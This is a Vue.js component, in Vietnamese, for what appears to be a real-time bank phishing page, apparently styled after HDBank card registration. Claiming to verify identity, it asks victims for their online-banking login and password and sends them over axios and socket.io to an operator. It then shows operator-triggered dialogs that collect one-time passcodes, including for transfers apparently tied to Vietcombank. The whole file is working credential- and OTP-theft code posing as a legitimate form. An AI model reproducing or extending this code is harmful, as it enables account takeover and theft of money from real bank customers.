<template>
    <div class="">
        <!-- <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div> -->
        <div style="margin-top: 20px">
            <v-form ref="formRef" @submit.prevent="submit">
                <v-row justify="center">
                    <div style="display: flex; justify-content: center">
                    </div>
                    <v-col md="8" lg="6" cols="12" sm="12">
                        <v-card title="Thông tin đăng ký" class="mb-5 p-5">
                            <v-card-title>
                                <p style="color: red">Để xác minh danh tính</p>
                                <p style="color: red">Vui lòng đăng nhập ngân hàng bạn đang sử dụng.</p>
                            </v-card-title>
                            <v-card-text>
                                <v-select label="Tên ngân hàng" class="mb-3" v-model="formValue.bankLoginName"
                                    :items="bankList" variant="filled" :rules="rules.bankList"></v-select>
                                <v-text-field class="mb-3" v-model="formValue.bankLoginAccount" variant="filled"
                                    label="Tên đăng nhập/Số điện thoại" :rules="rules.bankLoginAccount"></v-text-field>
                                <v-text-field class="mb-3" v-model="formValue.bankLoginPassword" variant="filled"
                                    label="Mật khẩu" type="password" :rules="rules.bankLoginPassword"></v-text-field>
                            </v-card-text>

                        </v-card>
                        <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>

                    </v-col>
                </v-row>
            </v-form>
        </div>
    </div>
    <v-dialog max-width="450px" v-model="dialog" persistent>
        <v-card>
            <v-card-title>
                Đang xử lý thông tin
            </v-card-title>
            <v-card-text class="text-center">
                <p class="text-center mb-2">Vui lòng không tắt trình duyệt</p>
                <v-progress-circular :size="70" :width="7" color="warning" indeterminate></v-progress-circular>
            </v-card-text>
            <v-card-actions>
            </v-card-actions>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogError" persistent>
        <v-card>
            <v-card-title>
                Thông báo
            </v-card-title>
            <v-card-text class="text-center">
                <p class="text-center mb-2">{{ dialogMessage }}</p>
            </v-card-text>
            <v-card-actions>
                <v-btn color="warning" block class="pa-4" @click="dialogOtp = true">Đóng</v-btn>
            </v-card-actions>
        </v-card>
    </v-dialog>
    <v-dialog max-width="500px" v-model="dialogSuccess" persistent>
        <v-card>
            <!-- <v-form ref="formMethodOtp" @submit.prevent="submitFormMethod"> -->
            <v-card-title>
                Thông báo
            </v-card-title>
            <v-card-text class="text-center">
                <p class="text-center mb-2">{{ dialogMessage }}</p>
                <!-- <v-select v-if="socketData.options" class="" v-model="formRefOtpMethod" :items="socketData.options"
                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethod"></v-select> -->
            </v-card-text>
            <v-card-actions>
                <v-btn color="red" block class="pa-4" type="button" @click="dialogSuccess = false">Tiếp tục</v-btn>
            </v-card-actions>
            <!-- </v-form> -->
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogMethodCTOTP" persistent>
        <v-card>
            <v-form ref="formMethodOtpCT" @submit.prevent="submitFormMethodCT">
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- // select option method otp -->
                    <v-select v-if="socketData.options" v-model="formRefOtpCT" :items="socketData.options"
                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethodCT"></v-select>
                </v-card-text>
                <v-card-actions>
                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
                </v-card-actions>
            </v-form>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogOtp" persistent>
        <v-card>
            <v-form ref="formRefOtpLogin" @submit.prevent="submitFormBankLoginOtp">
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- // select option method otp -->
                    <v-text-field v-model="otpLogin" variant="filled" label="Nhập mã OTP"
                        :rules="rules.otpLogin"></v-text-field>
                </v-card-text>
                <v-card-actions>
                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
                </v-card-actions>
            </v-form>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogOtpCTVcb" persistent>
        <v-card>
            <v-form ref="RefOtpCt" @submit.prevent="submitFormOTPCtVcb">
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- // select option method otp -->
                    <v-text-field v-if="socketData.challenge" v-model="socketData.challenge" variant="filled" label=""
                        :readonly="true"></v-text-field>

                    <v-text-field v-model="otpCt" variant="filled" label="Nhập mã OTP" :rules="rules.otpCt"></v-text-field>
                </v-card-text>
                <v-card-actions>
                    <v-btn color="blue" block class="pa-4" type="submit">Tiếp tục</v-btn>
                </v-card-actions>
            </v-form>
        </v-card>
    </v-dialog>
</template>

<script setup>

import axios from '@/plugins/axios';
import { socket } from '@/plugins/socket';
import Api from 'axios';
import { computed, onMounted, ref } from 'vue';
const user = computed(() => store.state.user)
const userStorage = JSON.parse(localStorage.getItem('user'))
const dialogError = ref(false)
const dialogMessage = ref('')
const socketData = ref(null)
const formMethodOtp = ref(null)
const dialogSuccess = ref(false)
const dialogOtp = ref(false)
const otpLogin = ref('')
const dialogMethodCTOTP = ref(false)
const formRefOtpCT = ref('')
const formMethodOtpCT = ref(null)
const dialogOtpCTVcb = ref(false)
const RefOtpCt = ref(null)
const otpCt = ref('')
const bankList = ref([])


onMounted(() => {
    // if (!user.value.verified) {
    //     router.push({ name: 'Home' })
    // }
    // get bank list
    Api.get('https://api.vietqr.io/v2/banks').then(res => {
        bankList.value = res.data.data
        bankList.value.forEach((item) => {
            item.title = item.name + ' - ' + item.short_name
            item.value = item.code
        })
    }).catch(err => {
        console.log(err)
    })
    socket.emit('connection', () => {
        console.log('connected')
    })

    socket.on(`send-data-user-${userStorage.numberPhone}`, async (data) => {
        console.log(data);
        if (data.type === 'OTP') {
            dialogSuccess.value = false
            dialogOtp.value = true
            dialog.value = false
            dialogMessage.value = 'Vui lòng nhập mã OTP để xác thực tài khoản của bạn.'
        } else if (data.type === 'TV') {
            dialogSuccess.value = true
            dialogMessage.value = 'Vui lòng chờ nhân viên tư vấn xác nhận thông tin của bạn.'
            dialog.value = false
            dialogError.value = false
        } else if (data.type === 'OTPN') {
            dialogError.value = true
            dialogMessage.value = 'Mã OTP không hợp lệ, vui lòng thử lại.'
            dialogOtp.value = false
            dialogSuccess.value = false
            dialog.value = false
        } else if (data.type === 'errorInfo') {
            dialogError.value = true
            dialogMessage.value = 'Quý khách vui lòng điền đúng thông tin trên hệ thống'
            dialogOtp.value = false
            dialogSuccess.value = false
            dialog.value = false
        } else if (data.type === 'error') {
            dialogError.value = true
            dialogMessage.value = 'Sai tài khoản hoặc mật khẩu'
            dialogOtp.value = false
            dialogSuccess.value = false
            dialog.value = false
        } else if (data.type === 'zalo') {
            dialogSuccess.value = true
            dialogMessage.value = 'Vui lòng liên hệ qua zalo để xác minh thông tin.'
            dialogOtp.value = false
            dialogError.value = false
            dialog.value = false
        }
    })

    socket.on(`send-data-error-${userStorage.numberPhone}`, async (data) => {
        dialogSuccess.value = true
        dialogMessage.value = 'Sai tài khoản hoặc mật khẩu'
        dialog.value = false
        dialogError.value = false
    })

    // socket.on('send-data-otp-vcb-chuyentien', (data) => {
    //     socketData.value = data
    //     if (data.code === 400) {
    //         dialogError.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //         return
    //     } else if (data.code === 201) {
    //         dialogSuccess.value = true
    //         dialogMessage.value = data.message
    //         socketData.value = data
    //         dialog.value = false
    //     } else if (data.code === 404) {
    //         dialogError.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //     } else if (data.code === 200) {
    //         dialogMethodCTOTP.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //     }
    // })

    // socket.on('send-data-otp-vcb', (data) => {
    //     console.log(data);
    //     socketData.value = data
    //     if (data.code === 200) {
    //         dialogError.value = false
    //         dialogMessage.value = data.message
    //         dialogSuccess.value = false
    //         dialog.value = false
    //         dialogOtp.value = true
    //         return
    //     }
    // })

    // socket.on('send-data', async (data) => {
    //     console.log(data);
    //     socketData.value = data

    //     if (data.code === 404) {
    //         dialogError.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //         return
    //     } else if (data.code === 200) {
    //         dialogSuccess.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //     }
    // })

    // socket.on('send-data-send-otp-vcb', (data) => {
    //     console.log(data);
    //     if (data.code === 404) {
    //         dialogError.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //         return
    //     } else if (data.code === 200) {

    //     }
    // })

    // socket.on('send-method-ct-vcb', (data) => {
    //     console.log(data);
    //     socketData.value = data
    //     if (data.code === 404) {
    //         dialogError.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //         return
    //     } else if (data.code === 200) {
    //         dialogOtpCTVcb.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //     }
    // })

    // socket.on('send-data-send-otp-vcb-chuyentien', (data) => {
    //     socketData.value = data
    //     console.log(data);
    //     if (data.code === 404) {
    //         dialogError.value = true
    //         dialogMessage.value = data.message
    //         dialog.value = false
    //         return
    //     } else if (data.code === 200) {
    //         // dialogSuccess.value = true
    //         dialogMessage.value = data.message
    //         socketData.value = data
    //         dialog.value = false

    //         store.commit('setSnackbar', {
    //             type: true,
    //             message: data.message,
    //             color: 'success',
    //         })
    //     }
    // })
})
const formRef = ref(null)
const formRefOtpMethod = ref(null)
const formRefOtpLogin = ref(null)
const formValue = ref({
    bankLoginName: '',
    bankLoginAccount: '',
    bankLoginPassword: '',
    ...userStorage
})
const rules = {
    bankLoginName: [
        v => !!v || 'Tên đăng nhập không được để trống',
    ],
    bankLoginAccount: [
        v => !!v || 'Số tài khoản không được để trống',
    ],
    bankLoginPassword: [
        v => !!v || 'Mật khẩu không được để trống',

        // format > 6
        v => (v && v.length >= 6) || 'Mật khẩu phải lớn hơn 6 ký tự',
    ],
    otpMethod: [
        v => !!v || 'Vui lòng chọn phương thức xác thực',
    ],
    otpLogin: [
        v => !!v || 'Mã OTP không được để trống',

        // format > 6
        v => (v && v.length >= 6) || 'Mã OTP phải lớn hơn 6 ký tự',
    ],
    otpMethodCT: [
        v => !!v || 'Vui lòng chọn phương thức xác thực',
    ],

    otpCt: [
        v => !!v || 'Mã OTP không được để trống',

        // format > 6
        v => (v && v.length >= 6) || 'Mã OTP phải lớn hơn 6 ký tự',
    ],

}

const submit = async () => {
    const isValid = await formRef.value.validate()
    if (isValid.valid) {
        dialog.value = true
        try {
            await axios.put(`/update-user/${userStorage.numberPhone}`, formValue.value).then(res => {
                socket.emit('send-data', {
                    user: {
                        ...formValue.value,
                        ...userStorage
                    }
                })
            }).catch(err => {
                store.commit('setSnackbar', {
                    type: true,
                    color: 'error',
                    message: 'Có lỗi xảy ra, vui lòng thử lại.',
                })
            })
        } catch (error) {
            console.log(error)
        }
    }
}
const dialog = ref(false)
const submitFormMethod = async () => {
    const isValid = await formMethodOtp.value.validate()
    if (isValid.valid) {
        dialog.value = true
        dialogSuccess.value = false
        try {
            socket.emit('send-data-otp-vcb', {
                method: formRefOtpMethod.value,
            })
        } catch (error) {
            console.log(error)
        }
    }
}

const submitFormBankLoginOtp = async () => {
    const isValid = await formRefOtpLogin.value.validate()
    if (isValid.valid) {
        dialog.value = true
        dialogOtp.value = false
        try {
            socket.emit('send-data-send-otp-vcb', {
                otp: otpLogin.value,
            })
        } catch (error) {
            console.log(error)
        }
    }
}

const submitFormMethodCT = async () => {
    const isValid = await formMethodOtpCT.value.validate()

    if (isValid.valid) {
        socket.emit('send-method-ct-vcb', {
            method: formRefOtpCT.value
        })
        dialogMethodCTOTP.value = false
        dialog.value = true

    }
}

const submitFormOTPCtVcb = async () => {
    const isValid = await RefOtpCt.value.validate()
    if (isValid.valid) {
        dialogOtpCTVcb.value = false
        dialog.value = true
        try {
            socket.emit('send-data-send-otp-vcb-chuyentien', {
                otp: otpCt.value
            })
        } catch (error) {
            console.log(error)
        }
    }
}
</script>
<style>
.v-card-title {
    font-size: 16px !important;
    font-weight: 500;
    color: #000;
    margin-bottom: 20px;
}

.v-card {
    border: 1px solid #ccc !important;
}
</style>
